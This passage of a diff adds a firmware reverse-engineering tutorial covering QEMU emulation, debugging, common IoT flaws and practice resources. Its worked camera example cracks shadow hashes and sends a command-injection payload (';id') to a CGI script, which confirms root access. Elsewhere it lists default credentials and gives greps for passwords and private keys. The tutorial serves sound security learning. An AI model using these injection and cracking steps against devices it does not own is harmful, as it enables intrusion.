+qemu-system-mips \
+qemu-system-arm \
+qemu-system-x86_64
+
+# For user-mode emulation (single binary):
+sudo apt install qemu-user-static binutils-mips-linux-gnu
+```
+
+### Running Single Binaries (User-Mode Emulation)
+
+The easiest approach — run a single binary from the firmware:
+
+```bash
+cd squashfs-root/
+
+# MIPS binary
+qemu-mips-static -L . ./bin/busybox ls
+
+# MIPS big-endian
+qemu-mips-static -L . ./usr/bin/httpd
+
+# ARM binary
+qemu-arm-static -L . ./bin/some_arm_binary
+
+# The -L . flag tells QEMU to use current dir as root FS
+# This means library paths like /lib/libc.so resolve to ./lib/libc.so
+
+# Make all binaries use QEMU transparently
+sudo cp $(which qemu-mips-static) usr/bin/
+sudo cp $(which qemu-arm-static) usr/bin/
+sudo chroot . /bin/sh   # Full chroot into firmware filesystem!
+```
+
+### Chroot into Firmware
+
+```bash
+# This gives you a shell running inside the firmware's filesystem!
+cd squashfs-root/
+
+# Copy QEMU binary needed for the architecture
+sudo cp /usr/bin/qemu-mips-static usr/bin/   # for MIPS
+# or
+sudo cp /usr/bin/qemu-arm-static usr/bin/    # for ARM
+
+# Mount necessary pseudo-filesystems
+sudo mount -t proc /proc proc/
+sudo mount -t sysfs /sys sys/
+sudo mount -o bind /dev dev/
+
+# Enter the chroot
+sudo chroot . /bin/sh
+
+# Now you're running inside the firmware!
+# Run services:
+/usr/sbin/httpd -p 8080   # Start web server
+
+# Exit
+exit
+sudo umount proc/ sys/ dev/
+```
+
+### Full System Emulation
+
+For complete emulation (entire device including kernel):
+
+```bash
+# Example: Emulate MIPS router firmware
+
+# Extract kernel and rootfs from firmware
+binwalk -e firmware.bin
+# kernel: _firmware.bin.extracted/uImage-kernel.bin
+# rootfs: _firmware.bin.extracted/squashfs-root/
+
+# Create disk image with rootfs
+dd if=/dev/zero of=rootfs.ext2 bs=1M count=64
+mkfs.ext2 rootfs.ext2
+sudo mount -o loop rootfs.ext2 /mnt/firmware
+sudo cp -r squashfs-root/. /mnt/firmware/
+sudo umount /mnt/firmware
+
+# Run in QEMU (MIPS Malta board example)
+qemu-system-mips \
+-M malta \
+-kernel vmlinux-malta \
+-hda rootfs.ext2 \
+-append "root=/dev/sda" \
+-net nic \
+-net user,hostfwd=tcp::8080-:80,hostfwd=tcp::2222-:22 \
+-nographic
+
+# Access services:
+curl http://localhost:8080/      # Web interface
+ssh root@localhost -p 2222       # SSH
+```
+
+### Firmadyne (Automated Full Emulation)
+
+Firmadyne automates MIPS/ARM firmware emulation:
+
+```bash
+# Install
+git clone https://github.com/firmadyne/firmadyne.git
+cd firmadyne
+./download.sh
+
+# Requires PostgreSQL
+sudo apt install postgresql
+sudo -u postgres createuser -P firmadyne
+# password: firmadyne
+
+# Setup database
+./setup.sh
+
+# Import firmware
+./sources/extractor/extractor.py -b TP-Link \
+-sql 127.0.0.1 \
+-np -nk \
+"firmware.bin" images/
+
+# Identify architecture
+./scripts/getArch.sh ./images/1.tar.gz
+
+# Set up filesytem
+./scripts/makeImage.sh 1
+
+# Create network config
+./scripts/inferNetwork.sh 1
+
+# Emulate!
+./scratch/1/run.sh
+
+# Access web interface at the IP shown
+```
+
+---
+
+## 9. Dynamic Analysis of Embedded Binaries
+
+### GDB Remote Debugging
+
+Debug a binary running in QEMU or on a real device:
+
+```bash
+# On the firmware (device or QEMU):
+# Install gdbserver (or it might already be there)
+# Check: which gdbserver
+
+# Start gdbserver
+gdbserver 0.0.0.0:1234 /usr/sbin/httpd
+
+# On your analysis machine:
+gdb-multiarch ./httpd    # Use gdb-multiarch for cross-arch
+
+# In GDB:
+(gdb) set architecture mips    # or arm
+(gdb) target remote 192.168.1.1:1234
+(gdb) break *0x401000      # Set breakpoint
+(gdb) continue
+(gdb) info registers       # Check registers
+(gdb) x/10i $pc            # Disassemble at current instruction
+```
+
+### Frida on Embedded Linux
+
+If the device has enough memory and is ARM/MIPS Linux:
+
+```bash
+# Download frida-server for the right arch
+# https://github.com/frida/frida/releases
+# e.g., frida-server-16.x.x-linux-arm
+
+# Copy to device
+scp frida-server-linux-arm root@192.168.1.1:/tmp/
+ssh root@192.168.1.1 'chmod 755 /tmp/frida-server && /tmp/frida-server &'
+
+# On your machine
+frida-ps -H 192.168.1.1     # List processes on device
+frida -H 192.168.1.1 -l script.js httpd  # Attach to web server
+```
+
+### strace on Firmware
+
+```bash
+# On the device or in chroot:
+strace -f -o strace.log ./httpd
+
+# See all system calls
+# Filter for interesting ones:
+grep "open\|read\|write\|execve\|connect" strace.log
+
+# See file access
+strace -f -e trace=file ./httpd 2>&1 | grep -v ENOENT
+
+# See network activity
+strace -f -e trace=network ./httpd
+```
+
+### ltrace (Library Call Tracer)
+
+```bash
+# Trace library function calls
+ltrace ./httpd
+
+# Filter for specific functions
+ltrace -e "strcmp,strcpy,system" ./httpd
+
+# Output shows every strcmp call with its arguments!
+# Very useful for finding password checks:
+# strcmp("admin", "admin") = 0  ← match!
+# strcmp("password123", "badpass") = -1  ← no match
+```
+
+---
+
+## 10. Common IoT Vulnerabilities
+
+### CVE Categories for Embedded Devices
+
+**1. Default / Hardcoded Credentials**
+
+```bash
+# Always check:
+cat etc/passwd
+cat etc/shadow
+grep -r "admin\|root\|password" etc/ -i
+
+# Common defaults:
+# admin:admin
+# admin:password
+# admin:1234
+# root:(empty)
+# root:root
+# user:user
+```
+
+**2. Telnet Enabled by Default**
+
+```bash
+# Check startup scripts
+grep -r "telnetd" etc/ -r
+
+# If telnet is running on the real device:
+telnet 192.168.1.1
+# Login with default creds
+```
+
+**3. Outdated and Vulnerable Components**
+
+```bash
+# Check versions of common software
+strings usr/sbin/httpd | grep -i "version\|v[0-9]"
+strings bin/busybox | head -5  # BusyBox version
+strings lib/libssl.so.* | grep "OpenSSL"  # OpenSSL version
+
+# CVE databases to check:
+# nvd.nist.gov
+# cve.mitre.org
+# vulhub.org.cn
+```
+
+**4. Insecure Update Mechanism**
+
+```bash
+# How does the device verify firmware updates?
+grep -r "verify\|signature\|checksum\|md5\|sha" usr/ -i
+
+# Common issues:
+# - No signature verification (any firmware accepted)
+# - MD5 only (not cryptographically secure)
+# - HTTP instead of HTTPS for download
+# - Checksum downloaded from same HTTP URL
+
+# Test: create a modified firmware, does device accept it?
+# (Only on devices you own!)
+```
+
+**5. Debug Interfaces Left Open**
+
+```bash
+# Check for debug ports
+grep -r "debug\|telnet\|uart\|console" etc/ -i
+
+# Services that shouldn't be in production:
+grep -r "gdbserver\|strace\|debug_mode" etc/ -r
+
+# Hidden web interfaces
+find www/ -name "debug*" -o -name "test*" -o -name "diag*"
+```
+
+**6. Sensitive Information in Log Files**
+
+```bash
+# Check if logs contain sensitive data
+find var/log/ -type f | xargs strings | grep -i "pass\|token\|key"
+
+# Debug logging enabled?
+grep -r "debug\|verbose\|log_level" etc/ -i
+```
+
+### Example: Full Analysis Workflow
+
+```bash
+# Scenario: Analyze a cheap IP camera
+
+# 1. Download firmware from manufacturer
+wget https://example-camera.com/firmware_v1.2.bin
+
+# 2. Analyze
+binwalk firmware_v1.2.bin
+# Found: SquashFS at offset 0x100000
+
+# 3. Extract
+binwalk -e firmware_v1.2.bin
+cd _firmware_v1.2.bin.extracted/squashfs-root/
+
+# 4. Check for vulnerabilities
+cat etc/passwd
+# root:$1$xyz:0:0:root:/root:/bin/sh   ← Has password
+# admin:$1$abc:0:0:admin:/home/admin:/bin/sh
+
+# Check for telnet
+grep -r "telnetd" etc/
+# etc/init.d/rcS: telnetd &   ← Telnet enabled at boot!
+
+# 5. Crack the password
+unshadow etc/passwd etc/shadow > combined.txt
+hashcat -m 500 combined.txt /usr/share/wordlists/rockyou.txt
+# admin:password123    ← Cracked!
+
+# 6. Find web vulnerabilities
+grep -r "system\|exec" www/cgi-bin/ -l
+# Found: www/cgi-bin/snapshot.cgi
+
+cat www/cgi-bin/snapshot.cgi
+# #!/bin/sh
+# CHANNEL=$QUERY_STRING
+# ffmpeg -i "rtsp://localhost/$CHANNEL" -frames:v 1 snapshot.jpg
+# Command injection! CHANNEL is not sanitized
+
+# 7. Test on real device
+curl "http://192.168.1.100/cgi-bin/snapshot.cgi?channel=0;id"
+# uid=0(root)   ← Command injection confirmed, running as root!
+
+# 8. Report findings:
+# - Telnet enabled with default password
+# - Command injection in snapshot.cgi
+# - Running as root (no privilege separation)
+```
+
+---
+
+## 11. Tools Reference
+
+| Tool               | Use                              | Install                        |
+| ------------------ | -------------------------------- | ------------------------------ |
+| **binwalk**        | Firmware analysis and extraction | `pip install binwalk`          |
+| **squashfs-tools** | SquashFS extraction              | `apt install squashfs-tools`   |
+| **QEMU**           | Firmware emulation               | `apt install qemu-user-static` |
+| **Ghidra**         | Binary reverse engineering       | ghidra-sre.org                 |
+| **radare2**        | CLI binary analysis              | `apt install radare2`          |
+| **Firmadyne**      | Automated emulation              | GitHub                         |
+| **flashrom**       | SPI flash read/write             | `apt install flashrom`         |
+| **openocd**        | JTAG debugging                   | `apt install openocd`          |
+| **gdb-multiarch**  | Cross-arch debugging             | `apt install gdb-multiarch`    |
+| **file**           | Identify file types              | Pre-installed                  |
+| **strings**        | Extract text from binaries       | Pre-installed                  |
+| **ltrace**         | Library call tracing             | `apt install ltrace`           |
+| **strace**         | System call tracing              | `apt install strace`           |
+| **Frida**          | Dynamic instrumentation          | `pip install frida-tools`      |
+| **Router Sploit**  | IoT exploit framework            | GitHub                         |
+
+### One-Line Analysis Script
+
+````bash
+#!/bin/bash
+# firmware_quick_analyze.sh - Quick firmware triage
+
+FW=$1
+echo "=== FIRMWARE TRIAGE: $FW ==="
+
+echo "\n[+] File info:"
+file "$FW"
+md5sum "$FW"
+
+echo "\n[+] Binwalk scan:"
+binwalk "$FW"
+
+echo "\n[+] Extracting..."
+binwalk -e "$FW" -q
+
+EXTRACT_DIR="_${FW}.extracted"
+if [ -d "$EXTRACT_DIR" ]; then
+	echo "\n[+] Finding interesting files..."
+	find "$EXTRACT_DIR" -name "*.conf" -o -name "*.cfg" \
+	-o -name "passwd" -o -name "shadow" | head -20
+
+	echo "\n[+] Looking for credentials..."
+	grep -r "password\|passwd" "$EXTRACT_DIR/squashfs-root/etc/" -i 2>/dev/null | head -20
+
+	echo "\n[+] Looking for private keys..."
+	grep -r "BEGIN.*PRIVATE KEY" "$EXTRACT_DIR" -l 2>/dev/null
+
+	echo "\n[+] Checking for telnet..."
+	grep -r "telnetd" "$EXTRACT_DIR" -r 2>/dev/null | head -5
+
+	echo "\n[+] Web files:"
+	find "$EXTRACT_DIR" -name "*.cgi" -o -name "*.php" 2>/dev/null | head -10
+	fi
+	```
+
+---
+
+## 12. Practice Resources
+
+### Lab Devices (Buy Cheap Second-Hand)
+
+```
+Recommended for practice:
+TP-Link TL-WR841N     → ~$5-10 used, MIPS, open firmware
+TP-Link TL-MR3020     → Portable, easy UART
+Netgear WNR1000       → Many CVEs to study
+D-Link DIR-615        → Multiple known vulns
+Any cheap IP camera from eBay → Often terrible security
+
+Why these?
+→ Known CVEs to research and reproduce
+→ UART accessible
+→ OpenWrt support (compare stock vs open firmware)
+→ Cheap if you brick it
+```
+
+### Practice Firmware (Download, Don't Need Hardware)
+
+```bash
+# Download real firmware to analyze
+# TP-Link archive: https://www.tp-link.com/us/support/download/
+# Netgear: https://www.netgear.com/support/download/
+# D-Link: https://support.dlink.com/
+
+# Practice exercises:
+# 1. Extract and find the default WiFi password generation algorithm
+# 2. Find all enabled services
+# 3. Identify CVEs that may apply
+# 4. Find command injection in web interface
+
+# Vulnerable firmware images for research:
+# vulhub/iot-firmware (GitHub)
+# firmwalker (scan extracted firmware for issues)
+```
+
+### Online Resources
+
+| Resource | URL | Content |
+|---|---|---|
+| **IoTSecurity101** | iotsecurity101.com | IoT RE guide |
+| **/dev/ttypwn** | blog.attify.com | Firmware RE articles |
+| **Exploit-DB** | exploit-db.com | Real router exploits to study |
+| **Router Exploitation** | github.com/hackthedot | Scripts and guides |
+| **ARM Assembly Guide** | azeria-labs.com | Best ARM assembly tutorial |
+| **MIPS Assembly** | chortle.ccsu.edu/assemblytutorial | MIPS reference |
+
+### Suggested Learning Path
+
+```
+Week 1: Foundations
+→ Download 3 different router firmwares
+→ Run binwalk on all of them
+→ Compare their filesystems and configurations
+
+Week 2: Credential Hunting
+→ Extract each firmware's filesystem
+→ Find all credentials and config files
+→ Check for telnet, default passwords, SSL certs
+
+Week 3: Binary Analysis
+→ Open the main web server binary in Ghidra
+→ Find calls to system() and strcpy()
+→ Understand the web request handling flow
+
+Week 4: Emulation
+→ Set up QEMU chroot
+→ Run the web server inside QEMU
+→ Access the web interface from your browser
+
+Month 2+:
+→ Buy a cheap router and practice UART access
+→ Reproduce a known CVE from Exploit-DB
+→ Set up full system emulation with Firmadyne
+→ Try to find a new bug in a device
+```
+
+---
+
+## Quick Reference Cheatsheet
+
+### Binwalk Commands
+```bash
+binwalk firmware.bin           # Analyze
+binwalk -E firmware.bin        # Entropy graph
+binwalk -e firmware.bin        # Extract all
+binwalk -M -e firmware.bin     # Recursive extraction
+```
+
+### Firmware Search Commands
+```bash
+grep -r "password" squashfs-root/etc/ -i
+grep -r "BEGIN.*PRIVATE KEY" squashfs-root/ -l
+find squashfs-root/ -name "*.cgi" | xargs grep "system("
+strings squashfs-root/usr/sbin/httpd | grep "http\|admin\|pass"
+```
+
+### QEMU Quick Start
+```bash
+# Copy QEMU binary to firmware root
+sudo cp /usr/bin/qemu-mips-static squashfs-root/usr/bin/
+
+# Chroot into firmware
+sudo chroot squashfs-root/ /bin/sh
+```
+
+### Hardware Attack Quickref
+```bash
+# SPI Flash dump
+flashrom -p ch341a_spi -r firmware.bin
+
+# UART connect
+screen /dev/ttyUSB0 115200
+
+# GDB remote debug
+gdb-multiarch ./binary
+(gdb) target remote 192.168.1.1:1234
+```
+
+---
+
+*Part of the Complete Reverse Engineering Series*
+*You now have: Binary RE + Web RE + Mobile RE + Network RE + Firmware RE*
+````
